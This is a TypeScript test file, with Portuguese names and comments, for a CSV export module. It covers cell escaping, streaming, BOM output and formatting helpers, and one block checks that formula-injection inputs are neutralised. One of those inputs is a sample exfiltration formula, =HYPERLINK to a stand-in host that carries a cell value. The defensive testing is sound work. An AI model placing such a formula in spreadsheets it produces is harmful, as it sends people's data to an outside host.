// @vitest-environment node
import { readFileSync } from "node:fs";
import { describe, expect, it } from "vitest";

import {
  BOM,
  criarStreamDeCsv,
  escaparCelula,
  formatarReais,
  linhaCsv,
  nomeDoArquivo,
  textoDoCampo,
} from "./csv";

async function lerTudo(stream: ReadableStream<Uint8Array>): Promise<{ bytes: Uint8Array; texto: string }> {
  const leitor = stream.getReader();
  const partes: Uint8Array[] = [];
  for (;;) {
    const { done, value } = await leitor.read();
    if (done) break;
    partes.push(value);
  }
  const total = partes.reduce((s, p) => s + p.length, 0);
  const bytes = new Uint8Array(total);
  let pos = 0;
  for (const p of partes) {
    bytes.set(p, pos);
    pos += p.length;
  }
  return { bytes, texto: new TextDecoder("utf-8", { ignoreBOM: true }).decode(bytes) };
}

async function* paginasDe(...paginas: string[][][]): AsyncGenerator<string[][]> {
  for (const p of paginas) yield p;
}

describe("escaparCelula — RFC 4180", () => {
  it("texto simples sai como está", () => {
    expect(escaparCelula("Maria Silva", ",")).toBe("Maria Silva");
  });

  it("aspas duplas são dobradas e a célula vai entre aspas", () => {
    expect(escaparCelula('Ela disse "oi"', ",")).toBe('"Ela disse ""oi"""');
  });

  it("vírgula só força aspas quando o separador é vírgula", () => {
    expect(escaparCelula("Silva, Maria", ",")).toBe('"Silva, Maria"');
    expect(escaparCelula("Silva, Maria", ";")).toBe("Silva, Maria");
  });

  it("ponto e vírgula só força aspas quando o separador é ponto e vírgula", () => {
    expect(escaparCelula("a;b", ";")).toBe('"a;b"');
    expect(escaparCelula("a;b", ",")).toBe("a;b");
  });

  it("quebra de linha (LF ou CRLF) força aspas e é preservada dentro da célula", () => {
    expect(escaparCelula("linha1\nlinha2", ",")).toBe('"linha1\nlinha2"');
    expect(escaparCelula("linha1\r\nlinha2", ",")).toBe('"linha1\r\nlinha2"');
  });

  it("null, undefined e vazio viram célula vazia", () => {
    expect(escaparCelula(null, ",")).toBe("");
    expect(escaparCelula(undefined, ",")).toBe("");
    expect(escaparCelula("", ",")).toBe("");
  });

  it("números e booleanos viram texto", () => {
    expect(escaparCelula(42, ",")).toBe("42");
    expect(escaparCelula(true, ",")).toBe("true");
  });
});

describe("escaparCelula — injeção de fórmula", () => {
  it.each(["=SOMA(A1:A2)", "+1+1", "-2+3", "@SUM(A1)", "\tcmd", "\rcmd"])(
    "célula que começa com %j recebe apóstrofo na frente",
    (perigosa) => {
      const saida = escaparCelula(perigosa, ",");
      // Tira as aspas de envelope (o \r força aspas) e olha o conteúdo.
      const conteudo = saida.startsWith('"') ? saida.slice(1, -1) : saida;
      expect(conteudo.startsWith("'")).toBe(true);
      expect(conteudo.slice(1)).toBe(perigosa);
    },
  );

  it("a fórmula clássica de exfiltração fica inerte", () => {
    expect(escaparCelula('=HYPERLINK("http://x.com?d="&A1)', ",")).toBe(
      `"'=HYPERLINK(""http://x.com?d=""&A1)"`,
    );
  });

  it("o apóstrofo vem ANTES do escape de aspas, sem perder o conteúdo", () => {
    expect(escaparCelula("=1,2", ",")).toBe(`"'=1,2"`);
  });

  it("não mexe em quem só CONTÉM o caractere no meio", () => {
    expect(escaparCelula("a=b", ",")).toBe("a=b");
    expect(escaparCelula("maria@x.com", ",")).toBe("maria@x.com");
    expect(escaparCelula("1-2", ",")).toBe("1-2");
  });
});

describe("linhaCsv", () => {
  it("junta com o separador e termina em CRLF", () => {
    expect(linhaCsv(["a", "b", "c"], ",")).toBe("a,b,c\r\n");
    expect(linhaCsv(["a", "b", "c"], ";")).toBe("a;b;c\r\n");
  });
});

describe("criarStreamDeCsv", () => {
  it("começa com o BOM UTF-8 (EF BB BF), para o Excel abrir acentos certo", async () => {
    const stream = criarStreamDeCsv({ cabecalho: ["Nome"], separador: ",", paginas: paginasDe([["José"]]) });
    const { bytes, texto } = await lerTudo(stream);
    expect(Array.from(bytes.slice(0, 3))).toEqual([0xef, 0xbb, 0xbf]);
    expect(texto.startsWith(BOM)).toBe(true);
    expect(texto).toBe(`${BOM}Nome\r\nJosé\r\n`);
  });

  it("escreve cabeçalho e todas as páginas, na ordem", async () => {
    const stream = criarStreamDeCsv({
      cabecalho: ["a", "b"],
      separador: ";",
      paginas: paginasDe([["1", "2"], ["3", "4"]], [["5", "6"]]),
    });
    const { texto } = await lerTudo(stream);
    expect(texto).toBe(`${BOM}a;b\r\n1;2\r\n3;4\r\n5;6\r\n`);
  });

  it("sem linhas, o arquivo ainda tem BOM e cabeçalho", async () => {
    const stream = criarStreamDeCsv({ cabecalho: ["a", "b"], separador: ",", paginas: paginasDe() });
    expect((await lerTudo(stream)).texto).toBe(`${BOM}a,b\r\n`);
  });

  it("escapa as células das linhas e do cabeçalho", async () => {
    const stream = criarStreamDeCsv({
      cabecalho: ["Nome", "=x"],
      separador: ",",
      paginas: paginasDe([["Silva, Maria", "=1+1"]]),
    });
    expect((await lerTudo(stream)).texto).toBe(`${BOM}Nome,'=x\r\n"Silva, Maria",'=1+1\r\n`);
  });

  it("é STREAMING: só pede a página seguinte quando o leitor consome", async () => {
    let pedidas = 0;
    async function* fonte(): AsyncGenerator<string[][]> {
      for (let i = 0; i < 50; i++) {
        pedidas += 1;
        yield [[String(i)]];
      }
    }
    const stream = criarStreamDeCsv({ cabecalho: ["n"], separador: ",", paginas: fonte() });
    const leitor = stream.getReader();
    await leitor.read(); // BOM + cabeçalho
    await leitor.read(); // primeira página
    // O stream tem fila interna pequena: nunca puxa as 50 páginas de uma vez.
    expect(pedidas).toBeLessThan(10);
    await leitor.cancel();
  });

  it("cancelar o stream encerra a fonte e avisa o callback com completo=false", async () => {
    let encerrada = false;
    async function* fonte(): AsyncGenerator<string[][]> {
      try {
        for (let i = 0; ; i++) yield [[String(i)]];
      } finally {
        encerrada = true;
      }
    }
    const fim: Array<{ linhas: number; completo: boolean }> = [];
    const stream = criarStreamDeCsv({
      cabecalho: ["n"],
      separador: ",",
      paginas: fonte(),
      aoEncerrar: (r) => void fim.push(r),
    });
    const leitor = stream.getReader();
    await leitor.read();
    await leitor.read();
    await leitor.cancel();
    expect(encerrada).toBe(true);
    expect(fim).toHaveLength(1);
    expect(fim[0]!.completo).toBe(false);
  });

  it("termina com o callback aoEncerrar(linhas, completo=true), uma vez só", async () => {
    const fim: Array<{ linhas: number; completo: boolean }> = [];
    const stream = criarStreamDeCsv({
      cabecalho: ["n"],
      separador: ",",
      paginas: paginasDe([["1"], ["2"]], [["3"]]),
      aoEncerrar: (r) => void fim.push(r),
    });
    await lerTudo(stream);
    expect(fim).toEqual([{ linhas: 3, completo: true }]);
  });

  it("erro na fonte no meio do arquivo derruba o stream (nunca entrega arquivo cortado como se estivesse inteiro)", async () => {
    async function* fonte(): AsyncGenerator<string[][]> {
      yield [["1"]];
      throw new Error("banco caiu");
    }
    const fim: Array<{ linhas: number; completo: boolean; erro?: string }> = [];
    const stream = criarStreamDeCsv({
      cabecalho: ["n"],
      separador: ",",
      paginas: fonte(),
      aoEncerrar: (r) => void fim.push(r),
    });
    await expect(lerTudo(stream)).rejects.toThrow("banco caiu");
    expect(fim).toEqual([{ linhas: 1, completo: false, erro: "banco caiu" }]);
  });
});

describe("nomeDoArquivo", () => {
  it("usa a data no fuso America/Sao_Paulo, não a do UTC", () => {
    // 01:30 UTC de 14/11 ainda é 22:30 de 13/11 em São Paulo (UTC-3).
    expect(nomeDoArquivo("contatos", new Date("2026-11-14T01:30:00Z"))).toBe("contatos-2026-11-13.csv");
    expect(nomeDoArquivo("leads", new Date("2026-11-13T15:00:00Z"))).toBe("leads-2026-11-13.csv");
  });
});

describe("formatarReais", () => {
  it("centavos viram reais com vírgula decimal e sem separador de milhar", () => {
    expect(formatarReais(123456)).toBe("1234,56");
    expect(formatarReais(5)).toBe("0,05");
    expect(formatarReais(100)).toBe("1,00");
    expect(formatarReais(0)).toBe("0,00");
  });
  it("nulo vira vazio", () => {
    expect(formatarReais(null)).toBe("");
  });
});

describe("textoDoCampo — valor de campo personalizado", () => {
  it("escalares viram texto; nulo vira vazio; objeto e lista viram JSON", () => {
    expect(textoDoCampo("x")).toBe("x");
    expect(textoDoCampo(10)).toBe("10");
    expect(textoDoCampo(false)).toBe("false");
    expect(textoDoCampo(null)).toBe("");
    expect(textoDoCampo(undefined)).toBe("");
    expect(textoDoCampo({ a: 1 })).toBe('{"a":1}');
    expect(textoDoCampo(["a", "b"])).toBe('["a","b"]');
  });
});

describe("BOM no código-fonte (M5)", () => {
  it("o BOM é escrito como escape \uFEFF, nunca como o caractere invisível literal (nem aqui nos testes de rota)", () => {
    const arquivos = [
      "lib/exportacao/csv.ts",
      "app/api/v1/contacts/export/route.test.ts",
      "app/api/v1/leads/export/route.test.ts",
      "lib/exportacao/csv.test.ts",
    ];
    for (const arquivo of arquivos) {
      expect(readFileSync(arquivo, "utf8").includes(String.fromCharCode(0xfeff)), arquivo).toBe(false);
    }
    expect(BOM).toBe(String.fromCharCode(0xfeff));
  });
});
